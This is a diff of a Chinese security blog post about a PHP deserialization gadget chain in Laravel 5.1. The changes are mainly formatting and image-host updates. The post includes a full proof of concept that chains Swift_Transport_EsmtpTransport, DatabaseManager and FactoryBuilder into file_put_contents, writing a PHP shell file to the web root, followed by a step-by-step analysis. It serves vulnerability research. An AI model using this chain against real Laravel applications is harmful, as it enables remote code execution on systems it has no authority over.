@@ -15,16 +15,16 @@
   
     <meta name="keywords" content="" />
   
-  <meta name="description" content="## 前言 挖一整天才挖出这一条，主要是钻牛角尖了，逮着一个地方使劲找链子。 poc先放poc吧 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpnamespace Illuminate\Database\Eloquent &amp;#123;    class Fa">
+  <meta name="description" content="## 前言挖一整天才挖出这一条，主要是钻牛角尖了，逮着一个地方使劲找链子。 poc先放poc吧 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpnamespace Illuminate\Database\Eloquent &amp;#123;    class Fac">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一条laravel5.1的链子">
 <meta property="og:url" content="https://fmyyy.gitee.io/2021/09/10/%E4%B8%80%E6%9D%A1laravel5.1%E7%9A%84%E9%93%BE%E5%AD%90/index.html">
 <meta property="og:site_name" content="fmyyy">
-<meta property="og:description" content="## 前言 挖一整天才挖出这一条，主要是钻牛角尖了，逮着一个地方使劲找链子。 poc先放poc吧 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpnamespace Illuminate\Database\Eloquent &amp;#123;    class Fa">
+<meta property="og:description" content="## 前言挖一整天才挖出这一条，主要是钻牛角尖了，逮着一个地方使劲找链子。 poc先放poc吧 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpnamespace Illuminate\Database\Eloquent &amp;#123;    class Fac">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
 <meta property="article:published_time" content="2021-09-10T13:14:04.000Z">
-<meta property="article:modified_time" content="2021-09-22T03:48:10.316Z">
+<meta property="article:modified_time" content="2021-09-22T04:01:42.502Z">
 <meta property="article:author" content="fmyyy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
@@ -181,7 +181,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~5.05K
+                        ~5.04K
                     
                     字
                 </li>
@@ -190,35 +190,28 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1632282490316"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1632283302502"></time> 前，其中的内容可能需要更新。
             </div>
             
                 <div class="kratos-post-inner-toc">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc%E5%88%86%E6%9E%90%E3%80%82"><span class="toc-number">2.</span> <span class="toc-text">poc分析。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">一些细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc%E5%88%86%E6%9E%90%E3%80%82"><span class="toc-number">2.</span> <span class="toc-text">poc分析。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82"><span class="toc-number">3.</span> <span class="toc-text">一些细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
                 </div>
             
             <hr />
-            <p>﻿## 前言</p>
-<p>挖一整天才挖出这一条，主要是钻牛角尖了，逮着一个地方使劲找链子。</p>
+            <p>﻿## 前言<br>挖一整天才挖出这一条，主要是钻牛角尖了，逮着一个地方使劲找链子。</p>
 <h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>先放poc吧</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Database\Eloquent &#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FactoryBuilder</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $definitions;</span><br><span class="line">        <span class="keyword">protected</span> $name;</span><br><span class="line">        <span class="keyword">protected</span> $<span class="class"><span class="keyword">class</span></span>;</span><br><span class="line">        <span class="keyword">protected</span> $faker;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> function <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;name=<span class="string">&#x27;fmyyy&#x27;</span>;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;fmyyy&#x27;</span>;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;faker = <span class="string">&#x27;/usr/local/var/www/la5.1/public/shell.php&#x27;</span>;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;definitions = array(<span class="string">&#x27;fmyyy&#x27;</span>=&gt;array(<span class="string">&#x27;fmyyy&#x27;</span>=&gt;<span class="string">&#x27;file_put_contents&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Database&#123;</span><br><span class="line">    use Illuminate\Database\Eloquent\FactoryBuilder;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DatabaseManager</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $factory;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> function <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;factory = <span class="keyword">new</span> FactoryBuilder();</span><br><span class="line">            $<span class="keyword">this</span>-&gt;app = array(<span class="string">&#x27;config&#x27;</span>=&gt;array(<span class="string">&#x27;database.default&#x27;</span>=&gt;<span class="string">&#x27;fmyyy&#x27;</span>,<span class="string">&#x27;database.connections&#x27;</span>=&gt;array(<span class="string">&#x27;fmyyy&#x27;</span>=&gt;array(<span class="string">&#x27;driver&#x27;</span>=&gt;<span class="string">&#x27;&lt;?=phpinfo();?&gt;&#x27;</span>))));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line"></span><br><span class="line">    use Illuminate\Database\DatabaseManager;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_Transport_EsmtpTransport</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_handlers;</span><br><span class="line">        <span class="keyword">protected</span> $_started = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">protected</span> $_eventDispatcher;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> function <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;_eventDispatcher = <span class="keyword">new</span> DatabaseManager();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">echo <span class="title">urlencode</span><span class="params">(serialize(new Swift_Transport_EsmtpTransport()</span>))</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="poc分析。"><a href="#poc分析。" class="headerlink" title="poc分析。"></a>poc分析。</h2><p>我找的destruct方法是Swift_Transport_AbstractSmtpTransport类的<br>看一下他做了什么。</p>
-<p><img src="http://blog.fmyyy.top/wp-content/uploads/2021/09/wp_editor_md_c2da7f81c6713eab5943dc4bde2a6956.jpg"></p>
-<p>调用了该类的stop方法 看一下stop</p>
-<p><img src="http://blog.fmyyy.top/wp-content/uploads/2021/09/wp_editor_md_62121d6c284b71b13e07ddc137e85fd5.jpg"><br>箭头这里可以触发__call方法，之后找__call就可以了。<br>但这个类是一个抽象类，所以用他的子类Swift_Transport_EsmtpTransport。</p>
-<p>之后是找__call方法。<br>我找到的是DatabaseManager类，看一下他的__call方法。</p>
-<p><img src="http://blog.fmyyy.top/wp-content/uploads/2021/09/wp_editor_md_da96dd09a5bd04a4eadfd4e618ce9a25.jpg"></p>
-<p>调用了该类的connection方法，看一下这个方法。</p>
-<p><img src="http://blog.fmyyy.top/wp-content/uploads/2021/09/wp_editor_md_a38b437ccb7991f43833f53cee545e50.jpg"></p>
-<p>重点在于$this-&gt;makeConnection方法</p>
-<p><img src="http://blog.fmyyy.top/wp-content/uploads/2021/09/wp_editor_md_41a103d623dcc7c4130b88941d8bf026.jpg"></p>
-<p>可以看到最下面可以调用任意类的make方法。<br>但其实这里本身就有call_user_func方法，但这里的没办法利用，这个等一下说原因。<br>全局找make方法。<br>最后在FactoryBuilder里</p>
-<p><img src="http://blog.fmyyy.top/wp-content/uploads/2021/09/wp_editor_md_00e35de16e8f789dc4483948b670b494.jpg"><br>该类的make调用了makeInstance<br>再看看makeInstance</p>
-<p><img src="http://blog.fmyyy.top/wp-content/uploads/2021/09/wp_editor_md_6e72cf57089165fe3f70c4c0f6d5cee6.jpg"><br>可以看到call_user_func了，并且参数全可控。所以我们的链子就通了</p>
-<h2>一些细节</h2>
-解答一下之前makeConnection方法里的call_user_func为啥不能用。我们看一下他的参数。
-
+<h2 id="poc分析。"><a href="#poc分析。" class="headerlink" title="poc分析。"></a>poc分析。</h2><p>我找的destruct方法是Swift_Transport_AbstractSmtpTransport类的<br>看一下他做了什么。<br><img src="https://img-blog.csdnimg.cn/22ab523d1bb843b383b2eaab7496f4f8.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZm15eXkx,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>调用了该类的stop方法 看一下stop<br><img src="https://img-blog.csdnimg.cn/8ef51dcae4f8484c8f666920fedebb04.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZm15eXkx,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>箭头这里可以触发__call方法，之后找__call就可以了。<br>但这个类是一个抽象类，所以用他的子类Swift_Transport_EsmtpTransport。</p>
+<p>之后是找__call方法。<br>我找到的是DatabaseManager类，看一下他的__call方法。<br><img src="https://img-blog.csdnimg.cn/d2d980a7e20041769946d03994b4ee65.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZm15eXkx,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>调用了该类的connection方法，看一下这个方法。<br><img src="https://img-blog.csdnimg.cn/0c7e2af2a3a1408fb76f827bab5e1510.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZm15eXkx,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>重点在于$this-&gt;makeConnection方法<br><img src="https://img-blog.csdnimg.cn/24ce940223ec4795bcbc0a051624cd09.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZm15eXkx,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>可以看到最下面可以调用任意类的make方法。<br>但其实这里本身就有call_user_func方法，但这里的没办法利用，这个等一下说原因。<br>全局找make方法。<br>最后在FactoryBuilder里<br><img src="https://img-blog.csdnimg.cn/14a6a8b8225749eda8325b24860a7c59.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZm15eXkx,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>该类的make调用了makeInstance<br>再看看makeInstance</p>
+<p>可以看到call_user_func了，并且参数全可控。所以我们的链子就通了<br><img src="https://img-blog.csdnimg.cn/c2be17ec6a1e418ca7297c78d184b309.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZm15eXkx,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h2 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h2><p>解答一下之前makeConnection方法里的call_user_func为啥不能用。我们看一下他的参数。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func($this-&gt;extensions[$name], $config, $name)</span><br></pre></td></tr></table></figure>
 
 <p>第一个参数extensions[$name]是可控的，没有问题，关键是第二个config参数，看一下这个参数是怎么来的。</p>
@@ -303,10 +296,9 @@
             const twitterBase   = "https://twitter.com/intent/tweet?";
             const hostUrl       = "https://fmyyy.gitee.io/2021/09/10/%E4%B8%80%E6%9D%A1laravel5.1%E7%9A%84%E9%93%BE%E5%AD%90/";
             const title         = "「一条laravel5.1的链子」";
-            const excerpt       = `﻿## 前言
-挖一整天才挖出这一条，主要是钻牛角尖了，逮着一个地方使劲找链子。
+            const excerpt       = `﻿## 前言挖一整天才挖出这一条，主要是钻牛角尖了，逮着一个地方使劲找链子。
 poc先放poc吧
-1234567891011121314151617181920212223242526272829303132333435363738...`;
+12345678910111213141516171819202122232425262728293031323334353637383...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -385,7 +377,7 @@ poc先放poc吧
         <span class="toc-progress-bar"></span>
     </h4>
     <div class="textwidget">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc%E5%88%86%E6%9E%90%E3%80%82"><span class="toc-text">poc分析。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">一些细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc%E5%88%86%E6%9E%90%E3%80%82"><span class="toc-text">poc分析。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82"><span class="toc-text">一些细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
     </div>
 </aside>
                 
